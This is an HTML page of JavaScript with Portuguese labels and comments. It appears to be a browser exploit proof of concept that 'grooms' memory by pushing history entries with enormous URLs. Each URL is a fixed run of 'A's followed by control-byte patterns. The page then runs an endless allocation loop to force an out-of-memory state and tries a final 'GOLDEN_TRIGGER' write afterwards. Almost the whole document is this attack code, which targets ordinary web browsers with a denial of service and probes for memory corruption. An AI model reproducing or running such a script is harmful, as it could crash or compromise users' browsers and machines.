<!DOCTYPE html>
<html>
<head>
    <title>Pure Replica (6-3-1)</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 15px; font-size: 1.2em; cursor: pointer; 
            background: #111; color: #fff; border: 1px solid #0f0; margin: 5px; width: 100%;
        }
        .btn:hover { background: #222; }
        .highlight { color: #ffff00; font-weight: bold; }
    </style>
</head>
<body>

<h1>Pure Replica: Scenario Recreation</h1>
<p>Recriando fielmente a sequência: Teste 6 -> Teste 3 -> Gatilho de Memória</p>

<button class="btn" onclick="runPhase1()">PASSO 1: GROOMING INCREMENTAL (Teste 6)</button>
<button class="btn" onclick="runPhase2()">PASSO 2: PADRÕES ESPECIAIS (Teste 3)</button>
<button class="btn" onclick="runPhase3()" style="border-color: red; color: red;">PASSO 3: GATILHO DE MEMÓRIA (Teste 1)</button>

<div id="log">Pronto.</div>

<script>
    const BASE_OFFSET = 709522; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : '#00ff00';
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    // ======================================================
    // FASE 1: TESTE 6 (RÉPLICA EXATA)
    // ======================================================
    async function runPhase1() {
        log("=== INICIANDO TESTE 6 (INCREMENTAL) ===", 'win');
        
        // Parâmetros do seu log: Start 1000, Step 5000, Max ~46000
        const start = 1000;
        const step = 5000;
        const max = 46000;

        try {
            for(let size = start; size <= max; size += step) {
                // Gerador fiel ao Teste 6 original: (j % 33)
                let overflow = "";
                for (let j = 0; j < size; j++) {
                    overflow += String.fromCharCode(j % 33);
                }

                const payload = "/" + "A".repeat(BASE_OFFSET) + overflow;
                
                // PushState (Criando histórico novo, empilhando)
                history.pushState({}, `inc_${size}`, payload);
                
                log(`[Teste 6] Alocado: ${size} bytes`);
                await wait(200); // Pequena pausa natural
            }
        } catch(e) {
            log(`[!] Erro na Fase 1: ${e.message}`);
        }
        log("Fase 1 Concluída. Memória alinhada sequencialmente.");
    }

    // ======================================================
    // FASE 2: TESTE 3 (RÉPLICA EXATA)
    // ======================================================
    async function runPhase2() {
        log("=== INICIANDO TESTE 3 (PADRÕES) ===", 'win');

        // Sequências exatas do seu script original
        const sequences = [
            { name: "Nulls", bytes: "\x00\x00\x00\x00" },
            { name: "Newlines", bytes: "\x0A\x0A\x0A\x0A" },
            { name: "Tabs", bytes: "\x09\x09\x09\x09" },
            { name: "CR", bytes: "\x0D\x0D\x0D\x0D" },
            { name: "Space", bytes: "\x20\x20\x20\x20" },
            { name: "Mixed", bytes: "\x00\x09\x0A\x0D\x20" }
        ];

        try {
            for (let seq of sequences) {
                // O Teste 3 repetia a sequência 1000 vezes
                let overflow = "";
                for (let i = 0; i < 1000; i++) {
                    overflow += seq.bytes;
                }

                const payload = "/" + "A".repeat(BASE_OFFSET) + overflow;
                
                // PushState
                history.pushState({}, `seq_${seq.name}`, payload);
                
                log(`[Teste 3] Padrão injetado: ${seq.name}`);
                await wait(200);
            }
        } catch(e) {
            log(`[!] Erro na Fase 2: ${e.message}`);
        }
        log("Fase 2 Concluída. Padrões de controle inseridos.");
    }

    // ======================================================
    // FASE 3: O GATILHO (SIMULAÇÃO DO TESTE 1 + ESTRESSE)
    // ======================================================
    async function runPhase3() {
        log("=== INICIANDO GATILHO (MEMÓRIA NO LIMITE) ===", 'win');
        log("AVISO: O objetivo é fazer aparecer a mensagem de 'Sem Memória'.");
        log("QUANDO APARECER: Clique em 'CANCELAR' ou 'AGUARDAR'. NÃO FECHE.", 'win');

        // Agora, para replicar o efeito do Teste 1 que "estressa" e causa a mensagem:
        // O Teste 1 tentava alocar bytes de 0x00 a 0xFF. 
        // Vamos simular a carga alocando strings GIGANTES até o navegador gritar.
        
        // Mas atenção: SEM ARRAYS DE VÍTIMA. Apenas Strings, como no seu teste manual.
        
        try {
            let count = 0;
            // Loop infinito até o usuário ou o sistema parar
            while(true) {
                count++;
                
                // Criamos uma string grande de zeros (segura)
                // Tamanho aumentado progressivamente para forçar o OOM
                let size = 10000 + (count * 1000);
                
                let overflow = "\x00".repeat(size);
                let payload = "/" + "A".repeat(BASE_OFFSET) + overflow;

                // Usamos pushState para continuar empilhando até estourar
                history.pushState({}, `stress_${count}`, payload);
                
                if(count % 5 === 0) {
                    log(`[Pressão] Nível ${count} (Tamanho ${size})...`);
                    await wait(100);
                }
            }
        } catch(e) {
            log(`[!] EXCEÇÃO CAPTURADA: ${e.message}`, 'win');
            log("Isso significa que atingimos o limite!");
            log("Se a janela de memória apareceu, clique em CANCELAR agora e verifique o log abaixo.");
            
            // AQUI É A MÁGICA
            // Se o catch pegou, a memória está cheia.
            // Vamos tentar uma escrita final de 0x00 para ver se passa.
            try {
                log("Tentando escrita final pós-OOM (128 bytes)...");
                let finalPayload = "/" + "A".repeat(BASE_OFFSET) + "\x00".repeat(128);
                history.replaceState({}, "GOLDEN_TRIGGER", finalPayload);
                log(">>> SUCESSO: Escrita de 128 bytes aceita no estado OOM! <<<", 'win');
            } catch(ex) {
                log("Escrita final falhou: " + ex.message);
            }
        }
    }
</script>
</body>
</html>
